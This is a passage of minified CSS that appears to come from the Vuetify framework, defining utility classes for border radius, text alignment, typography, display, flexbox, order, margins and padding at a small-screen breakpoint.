.rounded-bl-0{border-bottom-left-radius:0!important}.v-application .rounded-bl-sm{border-bottom-left-radius:2px!important}.v-application .rounded-bl{border-bottom-left-radius:4px!important}.v-application .rounded-bl-lg{border-bottom-left-radius:8px!important}.v-application .rounded-bl-xl{border-bottom-left-radius:24px!important}.v-application .rounded-bl-pill{border-bottom-left-radius:9999px!important}.v-application .rounded-bl-circle{border-bottom-left-radius:50%!important}.v-application .text-left{text-align:left!important}.v-application .text-right{text-align:right!important}.v-application .text-center{text-align:center!important}.v-application .text-justify{text-align:justify!important}[dir=ltr] .v-application .text-start{text-align:left!important}[dir=ltr] .v-application .text-end,[dir=rtl] .v-application .text-start{text-align:right!important}[dir=rtl] .v-application .text-end{text-align:left!important}.v-application .text-decoration-line-through{text-decoration:line-through!important}.v-application .text-decoration-none{text-decoration:none!important}.v-application .text-decoration-overline{text-decoration:overline!important}.v-application .text-decoration-underline{text-decoration:underline!important}.v-application .text-wrap{white-space:normal!important}.v-application .text-no-wrap{white-space:nowrap!important}.v-application .text-break{word-wrap:break-word!important;word-break:break-word!important}.v-application .text-truncate{white-space:nowrap!important;overflow:hidden!important;text-overflow:ellipsis!important}.v-application .text-none{text-transform:none!important}.v-application .text-capitalize{text-transform:capitalize!important}.v-application .text-lowercase{text-transform:lowercase!important}.v-application .text-uppercase{text-transform:uppercase!important}.v-application .text-h1{font-size:6rem!important;line-height:6rem;letter-spacing:-.015625em!important}.v-application .text-h1,.v-application .text-h2{font-weight:300;font-family:"Roboto",sans-serif!important}.v-application .text-h2{font-size:3.75rem!important;line-height:3.75rem;letter-spacing:-.0083333333em!important}.v-application .text-h3{font-size:3rem!important;line-height:3.125rem;letter-spacing:normal!important}.v-application .text-h3,.v-application .text-h4{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .text-h4{font-size:2.125rem!important;line-height:2.5rem;letter-spacing:.0073529412em!important}.v-application .text-h5{font-size:1.5rem!important;font-weight:400;letter-spacing:normal!important}.v-application .text-h5,.v-application .text-h6{line-height:2rem;font-family:"Roboto",sans-serif!important}.v-application .text-h6{font-size:1.25rem!important;font-weight:500;letter-spacing:.0125em!important}.v-application .text-subtitle-1{font-size:1rem!important;font-weight:400;line-height:1.75rem;letter-spacing:.009375em!important;font-family:"Roboto",sans-serif!important}.v-application .text-subtitle-2{font-size:.875rem!important;font-weight:500;line-height:1.375rem;letter-spacing:.0071428571em!important;font-family:"Roboto",sans-serif!important}.v-application .text-body-1{font-size:1rem!important;line-height:1.5rem;letter-spacing:.03125em!important}.v-application .text-body-1,.v-application .text-body-2{font-weight:400;font-family:"Roboto",sans-serif!important}.v-application .text-body-2{font-size:.875rem!important;line-height:1.25rem;letter-spacing:.0178571429em!important}.v-application .text-button{font-size:.875rem!important;font-weight:500;line-height:2.25rem;letter-spacing:.0892857143em!important;font-family:"Roboto",sans-serif!important;text-transform:uppercase!important}.v-application .text-caption{font-weight:400;line-height:1.25rem;letter-spacing:.0333333333em!important}.v-application .text-caption,.v-application .text-overline{font-size:.75rem!important;font-family:"Roboto",sans-serif!important}.v-application .text-overline{font-weight:500;line-height:2rem;letter-spacing:.1666666667em!important;text-transform:uppercase!important}@media(min-width:600px){.v-application .d-sm-none{display:none!important}.v-application .d-sm-inline{display:inline!important}.v-application .d-sm-inline-block{display:inline-block!important}.v-application .d-sm-block{display:block!important}.v-application .d-sm-table{display:table!important}.v-application .d-sm-table-row{display:table-row!important}.v-application .d-sm-table-cell{display:table-cell!important}.v-application .d-sm-flex{display:flex!important}.v-application .d-sm-inline-flex{display:inline-flex!important}.v-application .float-sm-none{float:none!important}.v-application .float-sm-left{float:left!important}.v-application .float-sm-right{float:right!important}.v-application .flex-sm-fill{flex:1 1 auto!important}.v-application .flex-sm-row{flex-direction:row!important}.v-application .flex-sm-column{flex-direction:column!important}.v-application .flex-sm-row-reverse{flex-direction:row-reverse!important}.v-application .flex-sm-column-reverse{flex-direction:column-reverse!important}.v-application .flex-sm-grow-0{flex-grow:0!important}.v-application .flex-sm-grow-1{flex-grow:1!important}.v-application .flex-sm-shrink-0{flex-shrink:0!important}.v-application .flex-sm-shrink-1{flex-shrink:1!important}.v-application .flex-sm-wrap{flex-wrap:wrap!important}.v-application .flex-sm-nowrap{flex-wrap:nowrap!important}.v-application .flex-sm-wrap-reverse{flex-wrap:wrap-reverse!important}.v-application .justify-sm-start{justify-content:flex-start!important}.v-application .justify-sm-end{justify-content:flex-end!important}.v-application .justify-sm-center{justify-content:center!important}.v-application .justify-sm-space-between{justify-content:space-between!important}.v-application .justify-sm-space-around{justify-content:space-around!important}.v-application .align-sm-start{align-items:flex-start!important}.v-application .align-sm-end{align-items:flex-end!important}.v-application .align-sm-center{align-items:center!important}.v-application .align-sm-baseline{align-items:baseline!important}.v-application .align-sm-stretch{align-items:stretch!important}.v-application .align-content-sm-start{align-content:flex-start!important}.v-application .align-content-sm-end{align-content:flex-end!important}.v-application .align-content-sm-center{align-content:center!important}.v-application .align-content-sm-space-between{align-content:space-between!important}.v-application .align-content-sm-space-around{align-content:space-around!important}.v-application .align-content-sm-stretch{align-content:stretch!important}.v-application .align-self-sm-auto{align-self:auto!important}.v-application .align-self-sm-start{align-self:flex-start!important}.v-application .align-self-sm-end{align-self:flex-end!important}.v-application .align-self-sm-center{align-self:center!important}.v-application .align-self-sm-baseline{align-self:baseline!important}.v-application .align-self-sm-stretch{align-self:stretch!important}.v-application .order-sm-first{order:-1!important}.v-application .order-sm-0{order:0!important}.v-application .order-sm-1{order:1!important}.v-application .order-sm-2{order:2!important}.v-application .order-sm-3{order:3!important}.v-application .order-sm-4{order:4!important}.v-application .order-sm-5{order:5!important}.v-application .order-sm-6{order:6!important}.v-application .order-sm-7{order:7!important}.v-application .order-sm-8{order:8!important}.v-application .order-sm-9{order:9!important}.v-application .order-sm-10{order:10!important}.v-application .order-sm-11{order:11!important}.v-application .order-sm-12{order:12!important}.v-application .order-sm-last{order:13!important}.v-application .ma-sm-0{margin:0!important}.v-application .ma-sm-1{margin:4px!important}.v-application .ma-sm-2{margin:8px!important}.v-application .ma-sm-3{margin:12px!important}.v-application .ma-sm-4{margin:16px!important}.v-application .ma-sm-5{margin:20px!important}.v-application .ma-sm-6{margin:24px!important}.v-application .ma-sm-7{margin:28px!important}.v-application .ma-sm-8{margin:32px!important}.v-application .ma-sm-9{margin:36px!important}.v-application .ma-sm-10{margin:40px!important}.v-application .ma-sm-11{margin:44px!important}.v-application .ma-sm-12{margin:48px!important}.v-application .ma-sm-13{margin:52px!important}.v-application .ma-sm-14{margin:56px!important}.v-application .ma-sm-15{margin:60px!important}.v-application .ma-sm-16{margin:64px!important}.v-application .ma-sm-auto{margin:auto!important}.v-application .mx-sm-0{margin-right:0!important;margin-left:0!important}.v-application .mx-sm-1{margin-right:4px!important;margin-left:4px!important}.v-application .mx-sm-2{margin-right:8px!important;margin-left:8px!important}.v-application .mx-sm-3{margin-right:12px!important;margin-left:12px!important}.v-application .mx-sm-4{margin-right:16px!important;margin-left:16px!important}.v-application .mx-sm-5{margin-right:20px!important;margin-left:20px!important}.v-application .mx-sm-6{margin-right:24px!important;margin-left:24px!important}.v-application .mx-sm-7{margin-right:28px!important;margin-left:28px!important}.v-application .mx-sm-8{margin-right:32px!important;margin-left:32px!important}.v-application .mx-sm-9{margin-right:36px!important;margin-left:36px!important}.v-application .mx-sm-10{margin-right:40px!important;margin-left:40px!important}.v-application .mx-sm-11{margin-right:44px!important;margin-left:44px!important}.v-application .mx-sm-12{margin-right:48px!important;margin-left:48px!important}.v-application .mx-sm-13{margin-right:52px!important;margin-left:52px!important}.v-application .mx-sm-14{margin-right:56px!important;margin-left:56px!important}.v-application .mx-sm-15{margin-right:60px!important;margin-left:60px!important}.v-application .mx-sm-16{margin-right:64px!important;margin-left:64px!important}.v-application .mx-sm-auto{margin-right:auto!important;margin-left:auto!important}.v-application .my-sm-0{margin-top:0!important;margin-bottom:0!important}.v-application .my-sm-1{margin-top:4px!important;margin-bottom:4px!important}.v-application .my-sm-2{margin-top:8px!important;margin-bottom:8px!important}.v-application .my-sm-3{margin-top:12px!important;margin-bottom:12px!important}.v-application .my-sm-4{margin-top:16px!important;margin-bottom:16px!important}.v-application .my-sm-5{margin-top:20px!important;margin-bottom:20px!important}.v-application .my-sm-6{margin-top:24px!important;margin-bottom:24px!important}.v-application .my-sm-7{margin-top:28px!important;margin-bottom:28px!important}.v-application .my-sm-8{margin-top:32px!important;margin-bottom:32px!important}.v-application .my-sm-9{margin-top:36px!important;margin-bottom:36px!important}.v-application .my-sm-10{margin-top:40px!important;margin-bottom:40px!important}.v-application .my-sm-11{margin-top:44px!important;margin-bottom:44px!important}.v-application .my-sm-12{margin-top:48px!important;margin-bottom:48px!important}.v-application .my-sm-13{margin-top:52px!important;margin-bottom:52px!important}.v-application .my-sm-14{margin-top:56px!important;margin-bottom:56px!important}.v-application .my-sm-15{margin-top:60px!important;margin-bottom:60px!important}.v-application .my-sm-16{margin-top:64px!important;margin-bottom:64px!important}.v-application .my-sm-auto{margin-top:auto!important;margin-bottom:auto!important}.v-application .mt-sm-0{margin-top:0!important}.v-application .mt-sm-1{margin-top:4px!important}.v-application .mt-sm-2{margin-top:8px!important}.v-application .mt-sm-3{margin-top:12px!important}.v-application .mt-sm-4{margin-top:16px!important}.v-application .mt-sm-5{margin-top:20px!important}.v-application .mt-sm-6{margin-top:24px!important}.v-application .mt-sm-7{margin-top:28px!important}.v-application .mt-sm-8{margin-top:32px!important}.v-application .mt-sm-9{margin-top:36px!important}.v-application .mt-sm-10{margin-top:40px!important}.v-application .mt-sm-11{margin-top:44px!important}.v-application .mt-sm-12{margin-top:48px!important}.v-application .mt-sm-13{margin-top:52px!important}.v-application .mt-sm-14{margin-top:56px!important}.v-application .mt-sm-15{margin-top:60px!important}.v-application .mt-sm-16{margin-top:64px!important}.v-application .mt-sm-auto{margin-top:auto!important}.v-application .mr-sm-0{margin-right:0!important}.v-application .mr-sm-1{margin-right:4px!important}.v-application .mr-sm-2{margin-right:8px!important}.v-application .mr-sm-3{margin-right:12px!important}.v-application .mr-sm-4{margin-right:16px!important}.v-application .mr-sm-5{margin-right:20px!important}.v-application .mr-sm-6{margin-right:24px!important}.v-application .mr-sm-7{margin-right:28px!important}.v-application .mr-sm-8{margin-right:32px!important}.v-application .mr-sm-9{margin-right:36px!important}.v-application .mr-sm-10{margin-right:40px!important}.v-application .mr-sm-11{margin-right:44px!important}.v-application .mr-sm-12{margin-right:48px!important}.v-application .mr-sm-13{margin-right:52px!important}.v-application .mr-sm-14{margin-right:56px!important}.v-application .mr-sm-15{margin-right:60px!important}.v-application .mr-sm-16{margin-right:64px!important}.v-application .mr-sm-auto{margin-right:auto!important}.v-application .mb-sm-0{margin-bottom:0!important}.v-application .mb-sm-1{margin-bottom:4px!important}.v-application .mb-sm-2{margin-bottom:8px!important}.v-application .mb-sm-3{margin-bottom:12px!important}.v-application .mb-sm-4{margin-bottom:16px!important}.v-application .mb-sm-5{margin-bottom:20px!important}.v-application .mb-sm-6{margin-bottom:24px!important}.v-application .mb-sm-7{margin-bottom:28px!important}.v-application .mb-sm-8{margin-bottom:32px!important}.v-application .mb-sm-9{margin-bottom:36px!important}.v-application .mb-sm-10{margin-bottom:40px!important}.v-application .mb-sm-11{margin-bottom:44px!important}.v-application .mb-sm-12{margin-bottom:48px!important}.v-application .mb-sm-13{margin-bottom:52px!important}.v-application .mb-sm-14{margin-bottom:56px!important}.v-application .mb-sm-15{margin-bottom:60px!important}.v-application .mb-sm-16{margin-bottom:64px!important}.v-application .mb-sm-auto{margin-bottom:auto!important}.v-application .ml-sm-0{margin-left:0!important}.v-application .ml-sm-1{margin-left:4px!important}.v-application .ml-sm-2{margin-left:8px!important}.v-application .ml-sm-3{margin-left:12px!important}.v-application .ml-sm-4{margin-left:16px!important}.v-application .ml-sm-5{margin-left:20px!important}.v-application .ml-sm-6{margin-left:24px!important}.v-application .ml-sm-7{margin-left:28px!important}.v-application .ml-sm-8{margin-left:32px!important}.v-application .ml-sm-9{margin-left:36px!important}.v-application .ml-sm-10{margin-left:40px!important}.v-application .ml-sm-11{margin-left:44px!important}.v-application .ml-sm-12{margin-left:48px!important}.v-application .ml-sm-13{margin-left:52px!important}.v-application .ml-sm-14{margin-left:56px!important}.v-application .ml-sm-15{margin-left:60px!important}.v-application .ml-sm-16{margin-left:64px!important}.v-application .ml-sm-auto{margin-left:auto!important}.v-application--is-ltr .ms-sm-0{margin-left:0!important}.v-application--is-rtl .ms-sm-0{margin-right:0!important}.v-application--is-ltr .ms-sm-1{margin-left:4px!important}.v-application--is-rtl .ms-sm-1{margin-right:4px!important}.v-application--is-ltr .ms-sm-2{margin-left:8px!important}.v-application--is-rtl .ms-sm-2{margin-right:8px!important}.v-application--is-ltr .ms-sm-3{margin-left:12px!important}.v-application--is-rtl .ms-sm-3{margin-right:12px!important}.v-application--is-ltr .ms-sm-4{margin-left:16px!important}.v-application--is-rtl .ms-sm-4{margin-right:16px!important}.v-application--is-ltr .ms-sm-5{margin-left:20px!important}.v-application--is-rtl .ms-sm-5{margin-right:20px!important}.v-application--is-ltr .ms-sm-6{margin-left:24px!important}.v-application--is-rtl .ms-sm-6{margin-right:24px!important}.v-application--is-ltr .ms-sm-7{margin-left:28px!important}.v-application--is-rtl .ms-sm-7{margin-right:28px!important}.v-application--is-ltr .ms-sm-8{margin-left:32px!important}.v-application--is-rtl .ms-sm-8{margin-right:32px!important}.v-application--is-ltr .ms-sm-9{margin-left:36px!important}.v-application--is-rtl .ms-sm-9{margin-right:36px!important}.v-application--is-ltr .ms-sm-10{margin-left:40px!important}.v-application--is-rtl .ms-sm-10{margin-right:40px!important}.v-application--is-ltr .ms-sm-11{margin-left:44px!important}.v-application--is-rtl .ms-sm-11{margin-right:44px!important}.v-application--is-ltr .ms-sm-12{margin-left:48px!important}.v-application--is-rtl .ms-sm-12{margin-right:48px!important}.v-application--is-ltr .ms-sm-13{margin-left:52px!important}.v-application--is-rtl .ms-sm-13{margin-right:52px!important}.v-application--is-ltr .ms-sm-14{margin-left:56px!important}.v-application--is-rtl .ms-sm-14{margin-right:56px!important}.v-application--is-ltr .ms-sm-15{margin-left:60px!important}.v-application--is-rtl .ms-sm-15{margin-right:60px!important}.v-application--is-ltr .ms-sm-16{margin-left:64px!important}.v-application--is-rtl .ms-sm-16{margin-right:64px!important}.v-application--is-ltr .ms-sm-auto{margin-left:auto!important}.v-application--is-rtl .ms-sm-auto{margin-right:auto!important}.v-application--is-ltr .me-sm-0{margin-right:0!important}.v-application--is-rtl .me-sm-0{margin-left:0!important}.v-application--is-ltr .me-sm-1{margin-right:4px!important}.v-application--is-rtl .me-sm-1{margin-left:4px!important}.v-application--is-ltr .me-sm-2{margin-right:8px!important}.v-application--is-rtl .me-sm-2{margin-left:8px!important}.v-application--is-ltr .me-sm-3{margin-right:12px!important}.v-application--is-rtl .me-sm-3{margin-left:12px!important}.v-application--is-ltr .me-sm-4{margin-right:16px!important}.v-application--is-rtl .me-sm-4{margin-left:16px!important}.v-application--is-ltr .me-sm-5{margin-right:20px!important}.v-application--is-rtl .me-sm-5{margin-left:20px!important}.v-application--is-ltr .me-sm-6{margin-right:24px!important}.v-application--is-rtl .me-sm-6{margin-left:24px!important}.v-application--is-ltr .me-sm-7{margin-right:28px!important}.v-application--is-rtl .me-sm-7{margin-left:28px!important}.v-application--is-ltr .me-sm-8{margin-right:32px!important}.v-application--is-rtl .me-sm-8{margin-left:32px!important}.v-application--is-ltr .me-sm-9{margin-right:36px!important}.v-application--is-rtl .me-sm-9{margin-left:36px!important}.v-application--is-ltr .me-sm-10{margin-right:40px!important}.v-application--is-rtl .me-sm-10{margin-left:40px!important}.v-application--is-ltr .me-sm-11{margin-right:44px!important}.v-application--is-rtl .me-sm-11{margin-left:44px!important}.v-application--is-ltr .me-sm-12{margin-right:48px!important}.v-application--is-rtl .me-sm-12{margin-left:48px!important}.v-application--is-ltr .me-sm-13{margin-right:52px!important}.v-application--is-rtl .me-sm-13{margin-left:52px!important}.v-application--is-ltr .me-sm-14{margin-right:56px!important}.v-application--is-rtl .me-sm-14{margin-left:56px!important}.v-application--is-ltr .me-sm-15{margin-right:60px!important}.v-application--is-rtl .me-sm-15{margin-left:60px!important}.v-application--is-ltr .me-sm-16{margin-right:64px!important}.v-application--is-rtl .me-sm-16{margin-left:64px!important}.v-application--is-ltr .me-sm-auto{margin-right:auto!important}.v-application--is-rtl .me-sm-auto{margin-left:auto!important}.v-application .ma-sm-n1{margin:-4px!important}.v-application .ma-sm-n2{margin:-8px!important}.v-application .ma-sm-n3{margin:-12px!important}.v-application .ma-sm-n4{margin:-16px!important}.v-application .ma-sm-n5{margin:-20px!important}.v-application .ma-sm-n6{margin:-24px!important}.v-application .ma-sm-n7{margin:-28px!important}.v-application .ma-sm-n8{margin:-32px!important}.v-application .ma-sm-n9{margin:-36px!important}.v-application .ma-sm-n10{margin:-40px!important}.v-application .ma-sm-n11{margin:-44px!important}.v-application .ma-sm-n12{margin:-48px!important}.v-application .ma-sm-n13{margin:-52px!important}.v-application .ma-sm-n14{margin:-56px!important}.v-application .ma-sm-n15{margin:-60px!important}.v-application .ma-sm-n16{margin:-64px!important}.v-application .mx-sm-n1{margin-right:-4px!important;margin-left:-4px!important}.v-application .mx-sm-n2{margin-right:-8px!important;margin-left:-8px!important}.v-application .mx-sm-n3{margin-right:-12px!important;margin-left:-12px!important}.v-application .mx-sm-n4{margin-right:-16px!important;margin-left:-16px!important}.v-application .mx-sm-n5{margin-right:-20px!important;margin-left:-20px!important}.v-application .mx-sm-n6{margin-right:-24px!important;margin-left:-24px!important}.v-application .mx-sm-n7{margin-right:-28px!important;margin-left:-28px!important}.v-application .mx-sm-n8{margin-right:-32px!important;margin-left:-32px!important}.v-application .mx-sm-n9{margin-right:-36px!important;margin-left:-36px!important}.v-application .mx-sm-n10{margin-right:-40px!important;margin-left:-40px!important}.v-application .mx-sm-n11{margin-right:-44px!important;margin-left:-44px!important}.v-application .mx-sm-n12{margin-right:-48px!important;margin-left:-48px!important}.v-application .mx-sm-n13{margin-right:-52px!important;margin-left:-52px!important}.v-application .mx-sm-n14{margin-right:-56px!important;margin-left:-56px!important}.v-application .mx-sm-n15{margin-right:-60px!important;margin-left:-60px!important}.v-application .mx-sm-n16{margin-right:-64px!important;margin-left:-64px!important}.v-application .my-sm-n1{margin-top:-4px!important;margin-bottom:-4px!important}.v-application .my-sm-n2{margin-top:-8px!important;margin-bottom:-8px!important}.v-application .my-sm-n3{margin-top:-12px!important;margin-bottom:-12px!important}.v-application .my-sm-n4{margin-top:-16px!important;margin-bottom:-16px!important}.v-application .my-sm-n5{margin-top:-20px!important;margin-bottom:-20px!important}.v-application .my-sm-n6{margin-top:-24px!important;margin-bottom:-24px!important}.v-application .my-sm-n7{margin-top:-28px!important;margin-bottom:-28px!important}.v-application .my-sm-n8{margin-top:-32px!important;margin-bottom:-32px!important}.v-application .my-sm-n9{margin-top:-36px!important;margin-bottom:-36px!important}.v-application .my-sm-n10{margin-top:-40px!important;margin-bottom:-40px!important}.v-application .my-sm-n11{margin-top:-44px!important;margin-bottom:-44px!important}.v-application .my-sm-n12{margin-top:-48px!important;margin-bottom:-48px!important}.v-application .my-sm-n13{margin-top:-52px!important;margin-bottom:-52px!important}.v-application .my-sm-n14{margin-top:-56px!important;margin-bottom:-56px!important}.v-application .my-sm-n15{margin-top:-60px!important;margin-bottom:-60px!important}.v-application .my-sm-n16{margin-top:-64px!important;margin-bottom:-64px!important}.v-application .mt-sm-n1{margin-top:-4px!important}.v-application .mt-sm-n2{margin-top:-8px!important}.v-application .mt-sm-n3{margin-top:-12px!important}.v-application .mt-sm-n4{margin-top:-16px!important}.v-application .mt-sm-n5{margin-top:-20px!important}.v-application .mt-sm-n6{margin-top:-24px!important}.v-application .mt-sm-n7{margin-top:-28px!important}.v-application .mt-sm-n8{margin-top:-32px!important}.v-application .mt-sm-n9{margin-top:-36px!important}.v-application .mt-sm-n10{margin-top:-40px!important}.v-application .mt-sm-n11{margin-top:-44px!important}.v-application .mt-sm-n12{margin-top:-48px!important}.v-application .mt-sm-n13{margin-top:-52px!important}.v-application .mt-sm-n14{margin-top:-56px!important}.v-application .mt-sm-n15{margin-top:-60px!important}.v-application .mt-sm-n16{margin-top:-64px!important}.v-application .mr-sm-n1{margin-right:-4px!important}.v-application .mr-sm-n2{margin-right:-8px!important}.v-application .mr-sm-n3{margin-right:-12px!important}.v-application .mr-sm-n4{margin-right:-16px!important}.v-application .mr-sm-n5{margin-right:-20px!important}.v-application .mr-sm-n6{margin-right:-24px!important}.v-application .mr-sm-n7{margin-right:-28px!important}.v-application .mr-sm-n8{margin-right:-32px!important}.v-application .mr-sm-n9{margin-right:-36px!important}.v-application .mr-sm-n10{margin-right:-40px!important}.v-application .mr-sm-n11{margin-right:-44px!important}.v-application .mr-sm-n12{margin-right:-48px!important}.v-application .mr-sm-n13{margin-right:-52px!important}.v-application .mr-sm-n14{margin-right:-56px!important}.v-application .mr-sm-n15{margin-right:-60px!important}.v-application .mr-sm-n16{margin-right:-64px!important}.v-application .mb-sm-n1{margin-bottom:-4px!important}.v-application .mb-sm-n2{margin-bottom:-8px!important}.v-application .mb-sm-n3{margin-bottom:-12px!important}.v-application .mb-sm-n4{margin-bottom:-16px!important}.v-application .mb-sm-n5{margin-bottom:-20px!important}.v-application .mb-sm-n6{margin-bottom:-24px!important}.v-application .mb-sm-n7{margin-bottom:-28px!important}.v-application .mb-sm-n8{margin-bottom:-32px!important}.v-application .mb-sm-n9{margin-bottom:-36px!important}.v-application .mb-sm-n10{margin-bottom:-40px!important}.v-application .mb-sm-n11{margin-bottom:-44px!important}.v-application .mb-sm-n12{margin-bottom:-48px!important}.v-application .mb-sm-n13{margin-bottom:-52px!important}.v-application .mb-sm-n14{margin-bottom:-56px!important}.v-application .mb-sm-n15{margin-bottom:-60px!important}.v-application .mb-sm-n16{margin-bottom:-64px!important}.v-application .ml-sm-n1{margin-left:-4px!important}.v-application .ml-sm-n2{margin-left:-8px!important}.v-application .ml-sm-n3{margin-left:-12px!important}.v-application .ml-sm-n4{margin-left:-16px!important}.v-application .ml-sm-n5{margin-left:-20px!important}.v-application .ml-sm-n6{margin-left:-24px!important}.v-application .ml-sm-n7{margin-left:-28px!important}.v-application .ml-sm-n8{margin-left:-32px!important}.v-application .ml-sm-n9{margin-left:-36px!important}.v-application .ml-sm-n10{margin-left:-40px!important}.v-application .ml-sm-n11{margin-left:-44px!important}.v-application .ml-sm-n12{margin-left:-48px!important}.v-application .ml-sm-n13{margin-left:-52px!important}.v-application .ml-sm-n14{margin-left:-56px!important}.v-application .ml-sm-n15{margin-left:-60px!important}.v-application .ml-sm-n16{margin-left:-64px!important}.v-application--is-ltr .ms-sm-n1{margin-left:-4px!important}.v-application--is-rtl .ms-sm-n1{margin-right:-4px!important}.v-application--is-ltr .ms-sm-n2{margin-left:-8px!important}.v-application--is-rtl .ms-sm-n2{margin-right:-8px!important}.v-application--is-ltr .ms-sm-n3{margin-left:-12px!important}.v-application--is-rtl .ms-sm-n3{margin-right:-12px!important}.v-application--is-ltr .ms-sm-n4{margin-left:-16px!important}.v-application--is-rtl .ms-sm-n4{margin-right:-16px!important}.v-application--is-ltr .ms-sm-n5{margin-left:-20px!important}.v-application--is-rtl .ms-sm-n5{margin-right:-20px!important}.v-application--is-ltr .ms-sm-n6{margin-left:-24px!important}.v-application--is-rtl .ms-sm-n6{margin-right:-24px!important}.v-application--is-ltr .ms-sm-n7{margin-left:-28px!important}.v-application--is-rtl .ms-sm-n7{margin-right:-28px!important}.v-application--is-ltr .ms-sm-n8{margin-left:-32px!important}.v-application--is-rtl .ms-sm-n8{margin-right:-32px!important}.v-application--is-ltr .ms-sm-n9{margin-left:-36px!important}.v-application--is-rtl .ms-sm-n9{margin-right:-36px!important}.v-application--is-ltr .ms-sm-n10{margin-left:-40px!important}.v-application--is-rtl .ms-sm-n10{margin-right:-40px!important}.v-application--is-ltr .ms-sm-n11{margin-left:-44px!important}.v-application--is-rtl .ms-sm-n11{margin-right:-44px!important}.v-application--is-ltr .ms-sm-n12{margin-left:-48px!important}.v-application--is-rtl .ms-sm-n12{margin-right:-48px!important}.v-application--is-ltr .ms-sm-n13{margin-left:-52px!important}.v-application--is-rtl .ms-sm-n13{margin-right:-52px!important}.v-application--is-ltr .ms-sm-n14{margin-left:-56px!important}.v-application--is-rtl .ms-sm-n14{margin-right:-56px!important}.v-application--is-ltr .ms-sm-n15{margin-left:-60px!important}.v-application--is-rtl .ms-sm-n15{margin-right:-60px!important}.v-application--is-ltr .ms-sm-n16{margin-left:-64px!important}.v-application--is-rtl .ms-sm-n16{margin-right:-64px!important}.v-application--is-ltr .me-sm-n1{margin-right:-4px!important}.v-application--is-rtl .me-sm-n1{margin-left:-4px!important}.v-application--is-ltr .me-sm-n2{margin-right:-8px!important}.v-application--is-rtl .me-sm-n2{margin-left:-8px!important}.v-application--is-ltr .me-sm-n3{margin-right:-12px!important}.v-application--is-rtl .me-sm-n3{margin-left:-12px!important}.v-application--is-ltr .me-sm-n4{margin-right:-16px!important}.v-application--is-rtl .me-sm-n4{margin-left:-16px!important}.v-application--is-ltr .me-sm-n5{margin-right:-20px!important}.v-application--is-rtl .me-sm-n5{margin-left:-20px!important}.v-application--is-ltr .me-sm-n6{margin-right:-24px!important}.v-application--is-rtl .me-sm-n6{margin-left:-24px!important}.v-application--is-ltr .me-sm-n7{margin-right:-28px!important}.v-application--is-rtl .me-sm-n7{margin-left:-28px!important}.v-application--is-ltr .me-sm-n8{margin-right:-32px!important}.v-application--is-rtl .me-sm-n8{margin-left:-32px!important}.v-application--is-ltr .me-sm-n9{margin-right:-36px!important}.v-application--is-rtl .me-sm-n9{margin-left:-36px!important}.v-application--is-ltr .me-sm-n10{margin-right:-40px!important}.v-application--is-rtl .me-sm-n10{margin-left:-40px!important}.v-application--is-ltr .me-sm-n11{margin-right:-44px!important}.v-application--is-rtl .me-sm-n11{margin-left:-44px!important}.v-application--is-ltr .me-sm-n12{margin-right:-48px!important}.v-application--is-rtl .me-sm-n12{margin-left:-48px!important}.v-application--is-ltr .me-sm-n13{margin-right:-52px!important}.v-application--is-rtl .me-sm-n13{margin-left:-52px!important}.v-application--is-ltr .me-sm-n14{margin-right:-56px!important}.v-application--is-rtl .me-sm-n14{margin-left:-56px!important}.v-application--is-ltr .me-sm-n15{margin-right:-60px!important}.v-application--is-rtl .me-sm-n15{margin-left:-60px!important}.v-application--is-ltr .me-sm-n16{margin-right:-64px!important}.v-application--is-rtl .me-sm-n16{margin-left:-64px!important}.v-application .pa-sm-0{padding:0!important}.v-application .pa-sm-1{padding:4px!important}.v-application .pa-sm-2{padding:8px!important}.v-application .pa-sm-3{padding:12px!important}.v-application .pa-sm-4{padding:16px!important}.v-application .pa-sm-5{padding:20px!important}.v-application .pa-sm-6{padding:24px!important}.v-application .pa-sm-7{padding:28px!important}.v-application .pa-sm-8{padding:32px!important}.v-application .pa-sm-9{padding:36px!important}.v-application .pa-sm-10{padding:40px!important}.v-application .pa-sm-11{padding:44px!important}.v-application .pa-sm-12{padding:48px!important}.v-application .pa-sm-13{padding:52px!important}.v-application .pa-sm-14{padding:56px!important}.v-application .pa-sm-15{padding:60px!important}.v-application .pa-sm-16{padding:64px!important}.v-application .px-sm-0{padding-right:0!important;padding-left:0!important}.v-application .px-sm-1{padding-right:4px!important;padding-left:4px!important}.v-application .px-sm-2{padding-right:8px!important;padding-left:8px!important}.v-application .px-sm-3{padding-right:12px!important;padding-left:12px!important}.v-application .px-sm-4{padding-right:16px!important;padding-left:16px!important}.v-application .px-sm-5{padding-right:20px!important;padding-left:20px!important}.v-application .px-sm-6{padding-right:24px!important;padding-left:24px!important}.v-application .px-sm-7{padding-right:28px!important;padding-left:28px!important}.v-application .px-sm-8{padding-right:32px!important;padding-left:32px!important}.v-application .px-sm-9{padding-right:36px!important;padding-left:36px!important}.v-application .px-sm-10{padding-right:40px!important;padding-left:40px!important}.v-application .px-sm-11{padding-right:44px!important;padding-left:44px!important}.v-application .px-sm-12{padding-right:48px!important;padding-left:48px!important}.v-application .px-sm-13{padding-right:52px!important;padding-left:52px!important}.v-application .px-sm-14{padding-right:56px!important;padding-left:56px!important}.v-application .px-sm-15{padding-right:60px!important;padding-left:60px!important}.v-application .px-sm-16{padding-right:64px!important;padding-left:64px!important}.v-application .py-sm-0{padding-top:0!important;padding-bottom:0!important}.v-application .py-sm-1{padding-top:4px!important;padding-bottom:4px!important}.v-application .py-sm-2{padding-top:8px!important;padding-bottom:8px!important}.v-application .py-sm-3{padding-top:12px!important;padding-bottom:12px!important}.v-application .py-sm-4{padding-top:16px!important;padding-bottom:16px!important}.v-application .py-sm-5{padding-top:20px!important;padding-bottom:20px!important}.v-application .py-sm-6{padding-top:24px!important;padding-bottom:24px!important}.v-application .py-sm-7{padding-top:28px!important;padding-bottom:28px!important}.v-application .py-sm-8{padding-top:32px!important;padding-bottom:32px!important}.v-application .py-sm-9{padding-top:36px!important;padding-bottom:36px!important}.v-application .py-sm-10{padding-top:40px!important;padding-bottom:40px!important}.v-application .py-sm-11{padding-top:44px!important;padding-bottom:44px!important}.v-application .py-sm-12{padding-top:48px!important;padding-bottom:48px!important}.v-application .py-sm-13{padding-top:52px!important;padding-bottom:52px!important}.v-application .py-sm-14{padding-top:56px!important;padding-bottom:56px!important}.v-application .py-sm-15{padding-top:60px!important;padding-bottom:60px!important}.v-application .py-sm-16{padding-top:64px!important;padding-bottom:64px!important}.v-application .pt-sm-0{padding-top:0!important}.v-application .pt-sm-1{padding-top:4px!important}.v-application .pt-sm-2{padding-top:8px!important}.v-application 